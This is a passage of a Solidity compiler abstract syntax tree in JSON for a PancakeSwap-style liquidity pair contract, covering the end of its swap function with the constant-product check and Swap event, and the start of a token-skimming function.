																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 2099,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14430:5:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2097,
																					"name": "balance1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1898,
																					"src": "14417:8:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2098,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2298,
																				"src": "14417:12:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2100,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14417:19:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 2101,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2270,
																		"src": "14417:23:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 2106,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14417:42:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2107,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "14399:74:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "14375:98:6"
													},
													{
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2125,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 2112,
																				"name": "balance1Adjusted",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2096,
																				"src": "14533:16:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"id": 2110,
																				"name": "balance0Adjusted",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2082,
																				"src": "14512:16:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 2111,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "mul",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": 2298,
																			"src": "14512:20:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																				"typeString": "function (uint256,uint256) pure returns (uint256)"
																			}
																		},
																		"id": 2113,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "14512:38:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": ">=",
																	"rightExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				},
																				"id": 2123,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 2121,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14609:5:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "**",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 2122,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14618:1:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "14609:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 2118,
																						"name": "_reserve1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1879,
																						"src": "14594:9:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 2115,
																								"name": "_reserve0",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1877,
																								"src": "14579:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"id": 2114,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"nodeType": "ElementaryTypeNameExpression",
																							"src": "14574:4:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_type$_t_uint256_$",
																								"typeString": "type(uint256)"
																							},
																							"typeName": "uint"
																						},
																						"id": 2116,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "typeConversion",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "14574:15:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 2117,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2298,
																					"src": "14574:19:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 2119,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "14574:30:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 2120,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "mul",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": 2298,
																			"src": "14574:34:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																				"typeString": "function (uint256,uint256) pure returns (uint256)"
																			}
																		},
																		"id": 2124,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "14574:46:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "14512:108:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"argumentTypes": null,
																	"hexValue": "50616e63616b653a204b",
																	"id": 2126,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "14638:12:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_36f7756737193e2c474efd71f44e92bf4269370921f82a4ea4d5e4952e46633b",
																		"typeString": "literal_string \"Pancake: K\""
																	},
																	"value": "Pancake: K"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_stringliteral_36f7756737193e2c474efd71f44e92bf4269370921f82a4ea4d5e4952e46633b",
																		"typeString": "literal_string \"Pancake: K\""
																	}
																],
																"id": 2109,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	2359,
																	2360
																],
																"referencedDeclaration": 2360,
																"src": "14487:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 2127,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14487:177:6",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 2128,
														"nodeType": "ExpressionStatement",
														"src": "14487:177:6"
													}
												]
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2131,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1895,
															"src": "14693:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2132,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1898,
															"src": "14703:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2133,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1877,
															"src": "14713:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 2134,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1879,
															"src": "14724:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 2130,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1286,
														"src": "14685:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 2135,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14685:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2136,
												"nodeType": "ExpressionStatement",
												"src": "14685:49:6"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 2138,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2356,
																"src": "14754:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 2139,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "14754:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 2140,
															"name": "amount0In",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2039,
															"src": "14766:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2141,
															"name": "amount1In",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2055,
															"src": "14777:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2142,
															"name": "amount0Out",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1854,
															"src": "14788:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2143,
															"name": "amount1Out",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1856,
															"src": "14800:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2144,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1858,
															"src": "14812:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 2137,
														"name": "Swap",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1128
														],
														"referencedDeclaration": 1128,
														"src": "14749:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
															"typeString": "function (address,uint256,uint256,uint256,uint256,address)"
														}
													},
													"id": 2145,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14749:66:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2146,
												"nodeType": "EmitStatement",
												"src": "14744:71:6"
											}
										]
									},
									"documentation": null,
									"id": 2148,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1863,
											"modifierName": {
												"argumentTypes": null,
												"id": 1862,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1008,
												"src": "12084:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "12084:4:6"
										}
									],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1861,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1854,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 2148,
												"src": "11979:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1853,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11979:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1856,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 2148,
												"src": "12004:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1855,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12004:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1858,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2148,
												"src": "12029:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1857,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "12029:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1860,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 2148,
												"src": "12049:19:6",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1859,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "12049:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11969:105:6"
									},
									"returnParameters": {
										"id": 1864,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "12089:0:6"
									},
									"scope": 2224,
									"src": "11956:2866:6",
									"stateMutability": "nonpayable",
									"superFunction": 834,
									"visibility": "external"
								},
								{
									"body": {
										"id": 2195,
										"nodeType": "Block",
										"src": "18117:381:6",
										"statements": [
											{
												"assignments": [
													2156
												],
												"declarations": [
													{
														"constant": false,
														"id": 2156,
														"name": "_token0",
														"nodeType": "VariableDeclaration",
														"scope": 2195,
														"src": "18127:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 2155,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "18127:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2158,
												"initialValue": {
													"argumentTypes": null,
													"id": 2157,
													"name": "token0",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 968,
													"src": "18145:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "18127:24:6"
											},
											{
												"assignments": [
													2160
												],
												"declarations": [
													{
														"constant": false,
														"id": 2160,
														"name": "_token1",
														"nodeType": "VariableDeclaration",
														"scope": 2195,
														"src": "18176:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 2159,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "18176:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2162,
												"initialValue": {
													"argumentTypes": null,
													"id": 2161,
													"name": "token1",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 970,
													"src": "18194:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "18176:24:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2164,
															"name": "_token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2156,
															"src": "18252:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 2165,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2150,
															"src": "18273:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2175,
																	"name": "reserve0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 974,
																	"src": "18334:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2171,
																					"name": "this",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2386,
																					"src": "18323:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_contract$_Pair_$2224",
																						"typeString": "contract Pair"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_contract$_Pair_$2224",
																						"typeString": "contract Pair"
																					}
																				],
																				"id": 2170,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "18315:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_address_$",
																					"typeString": "type(address)"
																				},
																				"typeName": "address"
																			},
																			"id": 2172,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18315:13:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2167,
																					"name": "_token0",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2156,
																					"src": "18296:7:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_address",
																						"typeString": "address"
																					}
																				],
																				"id": 2166,
																				"name": "IERC20",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 533,
																				"src": "18289:6:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																					"typeString": "type(contract IERC20)"
																				}
																			},
																			"id": 2168,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "18289:15:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_IERC20_$533",
																				"typeString": "contract IERC20"
																			}
																		},
																		"id": 2169,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "balanceOf",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 494,
																		"src": "18289:25:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																			"typeString": "function (address) view external returns (uint256)"
																		}
																	},
																	"id": 2173,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "18289:40:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 2174,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 2270,
																"src": "18289:44:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 2176,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "18289:54:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 2163,
														"name": "_safeTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1096,
														"src": "18225:13:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 2177,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "18225:128:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2178,
												"nodeType": "ExpressionStatement",
												"src": "18225:128:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2180,
															"name": "_token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2160,
															"src": "18390:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 2181,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2150,
															"src": "18411:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2191,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "18472:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2187,
																					"name": "this",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2386,
																					"src": "18461:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_contract$_Pair_$2224",
																						"typeString": "contract Pair"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_contract$_Pair_$2224",
																						"typeString": "contract Pair"
																					}
																				],
																				"id": 2186,
																				"isConstant": false,
